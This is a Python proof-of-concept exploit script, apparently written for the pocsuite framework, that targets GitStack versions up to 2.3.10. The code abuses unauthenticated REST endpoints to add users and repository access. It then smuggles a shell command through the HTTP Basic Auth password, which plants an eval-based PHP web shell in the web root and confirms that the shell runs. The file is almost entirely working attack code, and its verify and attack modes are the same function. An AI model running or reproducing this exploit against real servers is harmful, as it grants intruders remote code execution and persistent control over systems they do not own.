#!/usr/bin/python
# -*- coding: utf-8 -*-
# from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from requests.auth import HTTPBasicAuth
import requests,urlparse,random,os,sys,hashlib,string


class TestPOC(POCBase):
    vulID = 'N/A'
    version = 'GitStack <= 2.3.10'
    author = 'co0ontty'
    vulDate = '2019-7-11'
    createDate = '2019-7-16'
    updateDate = '2018-3-31'
    references = ['https://xz.aliyun.com/t/2235']
    name = 'GitStack <= 2.3.10 远程命令执行漏洞分析'
    appPowerLink = 'https://gitstack.com'
    appName = 'GitStack'
    appVersion = 'GitStack <= 2.3.10'
    vulType = '文件上传'
    desc = '''
    该漏洞利用GitStack正常使用过程中调用的接口的未授权访问漏洞，越权读取、创建、修改用户列表、仓库。通过进一步利用实现恶意文件的上传。
    '''
    samples = []
    install_requires = []

    def _verify(self):
        result = {}
        target = self.url
        hostname = urlparse.urlparse(target).hostname
        port = urlparse.urlparse(target).port
        if port is None:
            target = target+":80"
        repository = ''.join(random.sample(string.digits+string.ascii_letters,4))
        username = ''.join(random.sample(string.digits+string.ascii_letters,4))
        password = ''.join(random.sample(string.digits+string.ascii_letters,4))
        csrf_token = ''.join(random.sample(string.digits+string.ascii_letters,4))
        user_list = []
        r_getuser = requests.get("{}/rest/user/".format(target))
        try:
            user_list = r_getuser.json()
            user_list.remove('everyone')
        except:
            pass
        if len(user_list) > 0:
            username = user_list[0]
        else:
            r_create_user = requests.post("{}/rest/user/".format(target),data={'username' : username, 'password' : password})
        r_getrepo = requests.get("{}/rest/repository/".format(target))
        repository_list = r_getrepo.json()
        if len(repository_list) > 0:
            repository = repository_list[0]['name']
        r_post_csrftoken = requests.post("{}/rest/repository/".format(target), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
        r_create_user = requests.post("{}/rest/repository/{}/user/{}/".format(target, repository, username))
        r_del_user = requests.delete("{}/rest/repository/{}/user/{}/".format(target, repository, "everyone"))
        random_file_name = ''.join(random.sample(string.ascii_letters+string.digits,16))+".php"
        random_identify_code = ''.join(random.sample(string.ascii_letters+string.digits,35))
        # webshell = 'p && echo "<?php echo"'+random_identify_code+'"; ?>" > c:'
        webshell = 'p && echo " <?php @eval($_POST[value]);echo"'+random_identify_code+'";?>" > c:'

        del_webshell = 'p && echo " <?php unlink("{}");unlink("{}")?>" > c:'.format(random_file_name,"del.php")

        r_create_file = requests.get('{}/web/index.php?p={}.git&a=summary'.format(target, repository), auth=HTTPBasicAuth(username, "{}".format(webshell)+random_file_name))
        test_url = target+"/web/"+random_file_name
        r_verify = requests.get(test_url)
        if (r_verify.status_code == 200):
            if (random_identify_code in r_verify.text):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                # result['VerifyInfo']['Result'] = test_url
                ## 触发文件删除
                r = requests.get('{}/web/index.php?p={}.git&a=summary'.format(target, repository), auth=HTTPBasicAuth(username, "{}".format(del_webshell)+"del.php"))
                r = requests.get(target+"/web/del.php")
                ##
            pass
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
